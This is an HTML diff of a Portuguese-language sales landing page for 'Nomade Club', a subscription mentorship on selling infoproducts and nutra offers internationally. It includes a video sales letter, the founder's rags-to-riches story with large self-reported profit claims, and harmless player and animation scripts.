+      <div class="vsl js-h" data-vsl="" style="position:relative;margin-right:calc(100% - min(46rem,100vw - 2*var(--gutter)));border-radius:18px;overflow:hidden;background:#000;box-shadow:0 40px 90px -40px rgba(0,0,0,.95),0 0 0 1px rgba(255,247,240,.14)"><style>.hero{--h0:max(760px,100% - min(46rem,100vw - 2*var(--gutter))*.5625 - 22px)}.hero>.coin[style*="top:17%"]{top:calc(var(--h0)*.17)!important}.hero>.coin[style*="top:24%"]{top:calc(var(--h0)*.24)!important}.hero>.coin[style*="top:43%"]{top:calc(var(--h0)*.43)!important}@media (min-width:900px){.hero{--h0:max(780px,100% - min(46rem,100vw - 2*var(--gutter))*.5625 - 22px)}.hero-media{bottom:auto;height:var(--h0)}}</style><vturb-smartplayer id="vid-6affe78dc0fe2cddc281108a" style="display: block; margin: 0px auto; width: 100%; --fakebar-background-color: #3D85C6; --fakebar-height: 10px; --resume-background-color: #c73e3e; --resume-foreground-color: #FFFFFF; --style-background: #1890FF; --style-background-100: #1890FFff; --style-background-90: #1890FFe6; --style-background-80: #1890FFcc; --style-background-70: #1890FFb3; --style-background-60: #1890FF99; --style-background-50: #1890FF80; --style-background-opacity: var(--style-background-80); --style-foreground: #FFFFFF; --style-foreground-100: #FFFFFFff; --style-foreground-90: #FFFFFFe6; --style-foreground-80: #FFFFFFcc; --style-foreground-70: #FFFFFFb3; --style-foreground-60: #FFFFFF99; --style-foreground-50: #FFFFFF80; --style-foreground-opacity: var(--style-foreground-80); --player-border-radius: 0px; --bigplay-background: #1890FF; --bigplay-background-hover: rgb(0, 113, 218);" original-id="vid-6affe78dc0fe2cddc281108a" vturb-player-intersection-element=""><div class="thumbnail" style="position: relative; width: 100%; padding: 56.25% 0 0; z-index: 0;"><img class="thumbnail-image" src="https://images.converteai.net/e6e99317-bea5-4278-a04d-e7732bc0fcb1/players/6affe78dc0fe2cddc281108a/thumbnail.jpg" style=" position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;  "></div></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/e6e99317-bea5-4278-a04d-e7732bc0fcb1/players/6affe78dc0fe2cddc281108a/v4/player.js", s.async=!0,document.head.appendChild(s); </script></div><style>.vsl-delay{display:none}[data-vsl-delay]{animation:vsl-in .7s cubic-bezier(.2,.7,.2,1) both}@keyframes vsl-in{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}@media (prefers-reduced-motion:reduce){[data-vsl-delay]{animation:none}}</style><script>(function(){var p=document.getElementById('vid-6affe78dc0fe2cddc281108a');if(!p)return;p.addEventListener('player:ready',function(){if(typeof p.displayHiddenElements==='function')p.displayHiddenElements(600,['.vsl-delay'],{persist:true});});})();</script>
+      <div class="vsl-delay" data-vsl-delay=""><div class="cta-row js-h" style="margin-top: 4px; translate: none; rotate: none; scale: none; opacity: 1; transform: translate(0px, 0px);">
+        <a class="cta js-cta" href="#oferta" id="0bdcc877-1dac-812f-280c-2f5b048ecb58">Quero entrar no Nomade Club<span class="ar"><svg><use href="#i-arrow"></use></svg></span></a>
+        <p class="micro" style="flex-direction:column;gap:2px"><span>Assinatura mensal, cancele quando quiser</span><span>7 dias de garantia</span></p>
+      </div></div>
+      <div class="vsl-delay" data-vsl-delay=""><div class="proof js-h">
+        
+        
+        <div style="translate: none; rotate: none; scale: none; opacity: 1; transform: translate(0px, 0px);"><b data-count="12" data-suffix=" anos">12 anos</b><small>no digital</small></div>
+      <div style="translate: none; rotate: none; scale: none; opacity: 1; transform: translate(0px, 0px);"><b data-count="30" data-suffix="+">30+</b><small>moedas</small></div><div style="translate: none; rotate: none; scale: none; opacity: 1; transform: translate(0px, 0px);"><b data-count="24" data-suffix="+">24+</b><small>países</small></div></div></div>
+    </div>
+  </div>
+</header>
+
+<div class="band js" id="band" aria-label="Europa, Ásia, Estados Unidos, América Latina, Oceania e África do Sul">
+  <div class="band-track" id="bandTrack" style="translate: none; rotate: none; scale: none; transform: translate(-7.0606%, 0%) translate3d(0px, 0px, 0px);">
+    <ul><li><span>Europa</span><svg><use href="#i-sun"></use></svg></li><li><span>Ásia</span><svg><use href="#i-sun"></use></svg></li><li><span>Estados Unidos</span><svg><use href="#i-sun"></use></svg></li><li><span>América Latina</span><svg><use href="#i-sun"></use></svg></li><li><span>Oceania</span><svg><use href="#i-sun"></use></svg></li><li><span>África do Sul</span><svg><use href="#i-sun"></use></svg></li></ul>
+    <ul aria-hidden="true"><li><span>Europa</span><svg><use href="#i-sun"></use></svg></li><li><span>Ásia</span><svg><use href="#i-sun"></use></svg></li><li><span>Estados Unidos</span><svg><use href="#i-sun"></use></svg></li><li><span>América Latina</span><svg><use href="#i-sun"></use></svg></li><li><span>Oceania</span><svg><use href="#i-sun"></use></svg></li><li><span>África do Sul</span><svg><use href="#i-sun"></use></svg></li></ul>
+  </div>
+</div>
+
+<main>
+<!-- BLOCO 3: LEAD -->
+<section class="sec in">
+  <div class="col letter">
+    <p class="big">Deixa eu te fazer uma pergunta.</p>
+    <p>Quanto você faturaria se, em vez de vender só para o Brasil, você pudesse vender para o mundo inteiro?</p>
+    <p>Pensa nisso por um segundo.</p>
+    <p>A maioria das pessoas no digital brasileiro está brigando pelo mesmo cliente. Vendendo o mesmo tipo de curso, no mesmo leilão de anúncio, em real, num mercado saturado de lançamento e de guru.</p>
+    <p>Enquanto isso, existe um grupo pequeno de brasileiros jogando outro jogo.</p>
+    <p>Vendendo suplemento na Europa. Infoproduto na América Latina. Ofertas na Ásia, um mercado que quase nenhum brasileiro sequer olha.</p>
+    <p><strong>E recebendo em euro, em dólar e em moedas que valem várias vezes o real.</strong></p>
+    <p>Eu faço parte desse grupo. Em 12 anos no digital, já faturei múltiplos 8 dígitos, em mais de 30 moedas diferentes, com operações na Europa, na Ásia, nas Américas, na Oceania e na África do Sul.</p>
+    <p>E foi esse modelo que me deu a coisa que eu mais valorizo: <strong>liberdade.</strong></p>
+    <p>Quando o seu cliente está no mundo inteiro, o seu escritório também pode estar.</p>
+    <figure class="vcard js-rv" data-dubai-office="" style="max-width: 320px; width: 100%; margin: 28px auto; translate: none; rotate: none; scale: none;" data-imp-reveal="up"><video preload="none" playsinline="" tabindex="-1" data-poster="midia/dubai-burj-poster.webp" src="https://nomadeclub.com.br/midia/dubai-burj.mp4" poster="https://nomadeclub.com.br/midia/dubai-burj-poster.webp"></video><button class="play" type="button" aria-label="Assistir o vídeo de Dubai" id="4f873d4d-acbf-4a98-4c95-195fedc76efc"><span><svg><use href="#i-play"></use></svg></span></button><figcaption><b>Meu escritório em Dubai</b></figcaption><span class="video-status" role="status" aria-live="polite"></span></figure>
+    <style>
+      figure[data-dubai-office] .play:hover span{transform:none}
+      figure[data-dubai-office] .play[aria-busy="true"] span{opacity:.65}
+      figure[data-dubai-office] .video-status{position:absolute;width:1px;height:1px;overflow:hidden;clip-path:inset(50%);white-space:nowrap}
+      @media(hover:hover) and (pointer:fine) and (prefers-reduced-motion:no-preference){figure[data-dubai-office] .play:hover span{transform:scale(1.08)}}
+      @media(prefers-reduced-motion:reduce){figure[data-dubai-office] .play span{transition:none}}
+    </style>
+    <script>
+      (()=>{
+        const card=document.querySelector('figure[data-dubai-office]');
+        const video=card.querySelector('video'), button=card.querySelector('button'), status=card.querySelector('.video-status');
+        let epoch=0, pending=false;
+        const reset=message=>{
+          if(!pending&&!card.classList.contains('playing')) return;
+          const restoreFocus=document.activeElement===video||document.activeElement===button;
+          ++epoch; pending=false;
+          card.classList.remove('playing'); button.setAttribute('aria-busy','false'); button.setAttribute('aria-label','Assistir o vídeo de Dubai');
+          video.controls=false; video.tabIndex=-1;
+          status.textContent=message;
+          video.pause(); video.load();
+          if(restoreFocus) button.focus({preventScroll:true});
+        };
+        const recover=()=>reset('Não foi possível reproduzir. Tente novamente.');
+        button.addEventListener('click',event=>{
+          event.stopImmediatePropagation();
+          if(pending){reset('Carregamento cancelado.'); return;}
+          const attempt=++epoch; pending=true;
+          button.setAttribute('aria-busy','true'); button.setAttribute('aria-label','Cancelar carregamento do vídeo de Dubai'); status.textContent='Carregando vídeo.';
+          document.querySelectorAll('.vcard video').forEach(other=>{if(other!==video&&!other.paused) other.pause();});
+          try {
+            const result=video.play();
+            if(result&&result.catch) result.catch(()=>{if(attempt===epoch) recover();});
+          } catch { if(attempt===epoch) recover(); }
+        },{capture:true});
+        video.addEventListener('playing',()=>{
+          if(!pending) return;
+          const transferFocus=document.activeElement===button;
+          pending=false; button.setAttribute('aria-busy','false'); button.setAttribute('aria-label','Assistir o vídeo de Dubai'); status.textContent='';
+          video.controls=true; video.tabIndex=0; card.classList.add('playing');
+          if(transferFocus) video.focus({preventScroll:true});
+        });
+        video.addEventListener('error',recover);
+      })();
+    </script>
+    <p>Já trabalhei de mais de 24 países. Morei na África do Sul, no Japão, na Tailândia e em Malta. Subo campanha de quarto de hotel, de café, de sala de embarque.</p>
+    <div class="pull"><p class="big js-scrub"><span class="w"><span style="" data-imp-reveal="up">Agora</span></span> <span class="w"><span style="" data-imp-reveal="up">imagina</span></span> <span class="w"><span style="" data-imp-reveal="up">por</span></span> <span class="w"><span style="" data-imp-reveal="up">um</span></span> <span class="w"><span style="" data-imp-reveal="up">instante.</span></span> <span class="w"><span style="" data-imp-reveal="up">Lucrar</span></span> <span class="w"><span style="" data-imp-reveal="up">R$300</span></span> <span class="w"><span style="" data-imp-reveal="up">mil</span></span> <span class="w"><span style="" data-imp-reveal="up">por</span></span> <span class="w"><span style="" data-imp-reveal="up">mês</span></span> <span class="w"><span style="" data-imp-reveal="up">vendendo</span></span> <span class="w"><span style="" data-imp-reveal="up">para</span></span> <span class="w"><span style="" data-imp-reveal="up">o</span></span> <span class="w"><span style="" data-imp-reveal="up">mundo,</span></span> <span class="w"><span style="" data-imp-reveal="up">e</span></span> <span class="w"><span style="" data-imp-reveal="up">escolher</span></span> <span class="w"><span style="" data-imp-reveal="up">de</span></span> <span class="w"><span style="" data-imp-reveal="up">qual</span></span> <span class="w"><span style="" data-imp-reveal="up">país</span></span> <span class="w"><span style="" data-imp-reveal="up">você</span></span> <span class="w"><span style="" data-imp-reveal="up">vai</span></span> <span class="w"><span style="" data-imp-reveal="up">trabalhar</span></span> <span class="w"><span style="" data-imp-reveal="up">no</span></span> <span class="w"><span style="" data-imp-reveal="up">mês</span></span> <span class="w"><span style="" data-imp-reveal="up">que</span></span> <span class="w"><span style="" data-imp-reveal="up">vem.</span></span></p></div>
+    <p>Isso não é sorte. Não é dom. Não é “coisa de quem já nasceu rico”.</p>
+    <p><strong>É um modelo.</strong> Eu chamo de <strong class="gold">Método Nômade</strong>. E a partir de agora eu vou abrir esse modelo ao vivo, toda semana, dentro do Nomade Club.</p>
+    <p>Mas antes você precisa entender uma coisa. Quem continua vendendo só para o Brasil, só em real, vai continuar pequeno. Não importa o quanto trabalhe.</p>
+    <p>Eu vou te mostrar por quê. Continua lendo.</p>
+  </div>
+</section>
+
+<!-- BLOCO 4: SOBRE MIM -->
+<section class="sky sec" id="sobre">
+  <div class="sun-disc js-par" data-speed="80" aria-hidden="true" style="--py: 0px;"></div>
+  <div class="in">
+    <div class="col">
+      <div class="sh">
+        <span class="tag"><i></i>Quem está por trás do Nomade Club</span>
+        <h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Quem</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">é</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Jeferson</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Borges</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">(e</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">por</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">que</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">você</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">deveria</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">me</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">ouvir)</span></span></em></h2>
+      </div>
+      <div class="letter">
+        <p>Eu comecei no digital com 19 anos.</p>
+        <p>Sem padrinho. Sem dinheiro sobrando. Sem ninguém para mostrar o caminho.</p>
+        <p class="big">Anos atrás, eu era motorista de Uber.</p>
+        <p>Rodava o dia inteiro. E tudo o que eu ganhava no Uber durante o dia, eu colocava em campanha no dia seguinte.</p>
+        <p>E queimava. Dia após dia.</p>
+        <p>Eu não tinha método. Não tinha ninguém para me dizer o que testar, o que cortar, o que escalar. Era tentativa e erro, pago com o dinheiro de cada corrida.</p>
+        <p>Mas eu não parei. Fiz isso até conseguir validar.</p>
+        <p>Queimei muito dinheiro que não precisava ter queimado. Se eu tivesse um método naquela época, teria chegado lá muito mais rápido. <strong>É exatamente por isso que o Nomade Club existe.</strong></p>
+        <p>E durante um bom tempo eu fiz o que quase todo brasileiro faz: vendi só para o Brasil. Brigando pelo mesmo cliente que todo mundo, no mesmo leilão, em real.</p>
+        <p>Até que eu olhei para fora.</p>
+        <p>A primeira venda em outra moeda mudou tudo na minha cabeça. O mesmo trabalho, a mesma copy, o mesmo anúncio. Só que agora o cliente estava do outro lado do mundo, e cada venda valia várias vezes mais.</p>
+        <p>A partir dali eu mudei três coisas:</p>
+        <ol class="steps">
+          <li><div><b>Parei de vender só para o Brasil.</b><span>Fui para a Europa, as Américas, a Ásia e a Oceania.</span></div></li>
+          <li><div><b>Aprendi a criar e validar minhas próprias ofertas.</b><span>Parei de depender de produto dos outros e de achismo.</span></div></li>
+          <li><div><b>Tirei a operação da mesa.</b><span>Automatizei tudo que dava. Hoje uma IA sobe e configura meus anúncios com um comando no celular.</span></div></li>
+        </ol>
+        <p>O resultado: 12 anos no digital. Múltiplos 8 dígitos faturados, em mais de 30 moedas. Infoproduto e nutra vendendo na Europa, na Ásia, na América Latina, na América do Norte, na Oceania e na África do Sul.</p>
+        <p>E uma vida que eu escolho onde viver. Mais de 24 países conhecidos. Morei na África do Sul, no Japão, na Tailândia e em Malta.</p>
+      </div>
+    </div>
+
+    <div class="feature mid">
+      <figure class="vcard js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><video preload="none" playsinline="" data-poster="midia/tailandia-poster.webp" src="https://nomadeclub.com.br/midia/tailandia.mp4"></video><button class="play" type="button" aria-label="Assistir o vídeo da Tailândia" id="fcb9f60b-6651-d527-7fe1-4254db5fed6d"><span><svg><use href="#i-play"></use></svg></span></button><figcaption><small>Lucro registrado em</small><b>Tailândia</b></figcaption></figure>
+      <div class="letter">
+        <span class="when">Fevereiro de 2026</span>
+        <p class="stat">Mais de <span>R$4 milhões</span> de lucro em um único mês.</p>
+        <p>Esse vídeo é de fevereiro de 2026. Eu estava na Tailândia quando bati a meta do mês.</p>
+        <p>Do outro lado do mundo, com o celular na mão. O mesmo cara que um dia colocava o dinheiro das corridas de Uber em campanha.</p>
+        <p>E o mais importante: eu não estou te contando isso de um palco. <strong>Eu estou operando agora.</strong> É por isso que o Nomade Club não é curso gravado. É o meu modelo aberto para você, ao vivo, toda semana.</p>
+      </div>
+    </div>
+  </div>
+  <div class="pin-spacer" style="order: 0; place-self: auto; grid-area: auto; z-index: auto; float: none; flex-shrink: 1; display: block; margin: 72px 0px 0px; inset: 0px; position: relative; flex-basis: auto; overflow: visible; box-sizing: border-box; width: 1440px; height: 2361px; padding: 0px 0px 1908px;"><div class="reel pinned" id="reel" aria-label="Fotos de viagem do Jeferson" style="translate: none; rotate: none; scale: none; inset: 0px auto auto 0px; margin: 0px; max-width: 1440px; width: 1440px; max-height: 453.328px; height: 453.328px; padding: 0px; transform: translate(0px, 0px);">
+    <div class="reel-track" id="reelTrack" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">
+      <div class="reel-intro"><b>24+</b><p>países conhecidos. Morei na África do Sul, no Japão, na Tailândia e em Malta. Alguns lugares de onde eu já trabalhei:</p></div>
+      <figure class="reel-card"><img src="https://nomadeclub.com.br/midia/japao-toquio.webp" srcset="https://nomadeclub.com.br/midia/japao-toquio-480.webp 480w, https://nomadeclub.com.br/midia/japao-toquio.webp 952w" sizes="(min-width: 520px) 340px, 72vw" alt="Jeferson em Tóquio, no Japão" width="952" height="1269" decoding="async" style="translate: none; rotate: none; scale: none; transform: translate(-3%, 0%) scale(1.08, 1.08);"><figcaption>Tóquio, Japão</figcaption></figure>
+      <figure class="reel-card"><img src="https://nomadeclub.com.br/midia/dubai.webp" srcset="https://nomadeclub.com.br/midia/dubai-480.webp 480w, https://nomadeclub.com.br/midia/dubai.webp 960w" sizes="(min-width: 520px) 340px, 72vw" alt="Jeferson diante do Burj Khalifa, em Dubai" width="960" height="1280" decoding="async" style="translate: none; rotate: none; scale: none; transform: translate(-3%, 0%) scale(1.08, 1.08);"><figcaption>Dubai, Emirados Árabes</figcaption></figure>
+      <figure class="reel-card"><img src="https://nomadeclub.com.br/midia/africa-do-sul-foto.webp" srcset="https://nomadeclub.com.br/midia/africa-do-sul-foto-480.webp 480w, https://nomadeclub.com.br/midia/africa-do-sul-foto.webp 844w" sizes="(min-width: 520px) 340px, 72vw" alt="Jeferson ao lado de um guepardo na África do Sul" width="844" height="1125" decoding="async" style="translate: none; rotate: none; scale: none; transform: translate(-3%, 0%) scale(1.08, 1.08);"><figcaption>África do Sul</figcaption></figure>
+      <figure class="reel-card"><img src="https://nomadeclub.com.br/midia/china-xangai.webp" srcset="https://nomadeclub.com.br/midia/china-xangai-480.webp 480w, https://nomadeclub.com.br/midia/china-xangai.webp 960w" sizes="(min-width: 520px) 340px, 72vw" alt="Jeferson de frente para a Oriental Pearl Tower, em Xangai" width="960" height="1280" decoding="async" style="translate: none; rotate: none; scale: none; transform: translate(-3%, 0%) scale(1.08, 1.08);"><figcaption>Xangai, China</figcaption></figure>
+      <figure class="reel-card"><img src="https://nomadeclub.com.br/midia/tailandia-templo.webp" srcset="https://nomadeclub.com.br/midia/tailandia-templo-480.webp 480w, https://nomadeclub.com.br/midia/tailandia-templo.webp 844w" sizes="(min-width: 520px) 340px, 72vw" alt="Jeferson em um templo na Tailândia" width="844" height="1125" decoding="async" style="translate: none; rotate: none; scale: none; transform: translate(-3%, 0%) scale(1.08, 1.08);"><figcaption>Tailândia</figcaption></figure>
+      <figure class="reel-card"><img src="https://nomadeclub.com.br/midia/estonia.webp" srcset="https://nomadeclub.com.br/midia/estonia-480.webp 480w, https://nomadeclub.com.br/midia/estonia.webp 960w" sizes="(min-width: 520px) 340px, 72vw" alt="Jeferson trabalhando no notebook, na Estônia" width="960" height="1280" decoding="async" style="translate: none; rotate: none; scale: none; transform: translate(-3%, 0%) scale(1.08, 1.08);"><figcaption>Estônia</figcaption></figure>
+      <figure class="reel-card"><img src="https://nomadeclub.com.br/midia/tailandia-erawan.webp" srcset="https://nomadeclub.com.br/midia/tailandia-erawan-480.webp 480w, https://nomadeclub.com.br/midia/tailandia-erawan.webp 844w" sizes="(min-width: 520px) 340px, 72vw" alt="Jeferson diante do elefante de três cabeças, na Tailândia" width="844" height="1125" decoding="async" style="translate: none; rotate: none; scale: none; transform: translate(-3%, 0%) scale(1.08, 1.08);"><figcaption>Tailândia</figcaption></figure>
+      <figure class="reel-card"><img src="https://nomadeclub.com.br/midia/japao-disney.webp" srcset="https://nomadeclub.com.br/midia/japao-disney-480.webp 480w, https://nomadeclub.com.br/midia/japao-disney.webp 955w" sizes="(min-width: 520px) 340px, 72vw" alt="Jeferson na Tokyo Disneyland, no Japão" width="955" height="1273" decoding="async" style="translate: none; rotate: none; scale: none; transform: translate(-3%, 0%) scale(1.08, 1.08);"><figcaption>Disney de Tóquio, Japão</figcaption></figure>
+    </div>
+  </div></div>
+</section>
+
+<!-- BLOCO 5: OPORTUNIDADE -->
+<section class="sec in" id="oportunidade">
+  <div class="col">
+    <div class="sh">
+      <span class="tag"><i></i>A matemática que ninguém te conta</span>
+      <h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Por</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">que</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">quem</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">vende</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">só</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">para</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">o</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Brasil</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">continua</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">pequeno</span></span></em></h2>
+      <p class="muted">Não é falta de esforço. É matemática.</p>
+    </div>
+  </div>
+  <div class="reasons">
+    <div class="card reason js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><span class="n">01</span><h3>Você briga no leilão mais lotado do país.</h3><p>Todo mundo vendendo para o mesmo público, com o mesmo tipo de oferta, no mesmo horário. O anúncio fica mais caro todo mês, e a sua margem some.</p></div>
+    <div class="card reason js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><span class="n">02</span><h3>Você vende na moeda mais fraca do jogo.</h3><p>O mesmo esforço, a mesma copy, o mesmo anúncio. Só que cada venda em real vale uma fração de uma venda em euro ou em dólar.</p></div>
+    <div class="card reason js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><span class="n">03</span><h3>Você tem teto.</h3><p>Um país, um idioma, um público cansado de promessa. Quando o seu nicho satura, você não tem para onde correr.</p></div>
+  </div>
+  <div class="col" style="margin-top:clamp(40px,6vw,72px)">
+    <h2 class="js-split" style="font-size:clamp(1.6rem,2vw + .6rem,2.4rem)"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Agora</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">olha</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">o</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">outro</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">lado.</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">O</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">mundo</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">está</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">comprando.</span></span></em> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Todo</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">dia.</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">A</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">toda</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">hora.</span></span></h2>
+  </div>
+  <div class="mapwrap" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+    <canvas id="map" aria-hidden="true" width="1184" height="592"></canvas>
+    <span class="map-legend"><i></i>Vendas saindo do Brasil para o mundo</span>
+  </div>
+  <div class="board" id="board">
+    <div class="board-top"><b><svg><use href="#i-plane"></use></svg>Mercados abertos</b><span id="boardClock">Agora, 13:14</span></div>
+    <div class="board-head"><span>Destino</span><span>Moedas</span><span>Status</span></div>
+    <div class="board-row"><div class="flaps js-board" data-len="14"><span class="cell" aria-hidden="true"><span class="ch">E</span></span><span class="cell" aria-hidden="true"><span class="ch">U</span></span><span class="cell" aria-hidden="true"><span class="ch">R</span></span><span class="cell" aria-hidden="true"><span class="ch">O</span></span><span class="cell" aria-hidden="true"><span class="ch">P</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span></div><span class="cur-list">EUR, GBP, CHF</span><span class="status"><span class="long">Comprando agora</span><span class="short">Comprando</span></span></div>
+    <div class="board-row"><div class="flaps js-board" data-len="14"><span class="cell" aria-hidden="true"><span class="ch">E</span></span><span class="cell" aria-hidden="true"><span class="ch">U</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">E</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">C</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">N</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">D</span></span><span class="cell" aria-hidden="true"><span class="ch">Á</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span></div><span class="cur-list">USD, CAD</span><span class="status"><span class="long">Comprando agora</span><span class="short">Comprando</span></span></div>
+    <div class="board-row"><div class="flaps js-board" data-len="14"><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">M</span></span><span class="cell" aria-hidden="true"><span class="ch">É</span></span><span class="cell" aria-hidden="true"><span class="ch">R</span></span><span class="cell" aria-hidden="true"><span class="ch">I</span></span><span class="cell" aria-hidden="true"><span class="ch">C</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">L</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">T</span></span><span class="cell" aria-hidden="true"><span class="ch">I</span></span><span class="cell" aria-hidden="true"><span class="ch">N</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span></div><span class="cur-list">MXN, COP, CLP</span><span class="status"><span class="long">Comprando agora</span><span class="short">Comprando</span></span></div>
+    <div class="board-row"><div class="flaps js-board" data-len="14"><span class="cell" aria-hidden="true"><span class="ch">Á</span></span><span class="cell" aria-hidden="true"><span class="ch">S</span></span><span class="cell" aria-hidden="true"><span class="ch">I</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span></div><span class="cur-list">JPY, THB e outras</span><span class="status"><span class="long">Comprando agora</span><span class="short">Comprando</span></span></div>
+    <div class="board-row"><div class="flaps js-board" data-len="14"><span class="cell" aria-hidden="true"><span class="ch">O</span></span><span class="cell" aria-hidden="true"><span class="ch">C</span></span><span class="cell" aria-hidden="true"><span class="ch">E</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">N</span></span><span class="cell" aria-hidden="true"><span class="ch">I</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span></div><span class="cur-list">AUD, NZD</span><span class="status"><span class="long">Comprando agora</span><span class="short">Comprando</span></span></div>
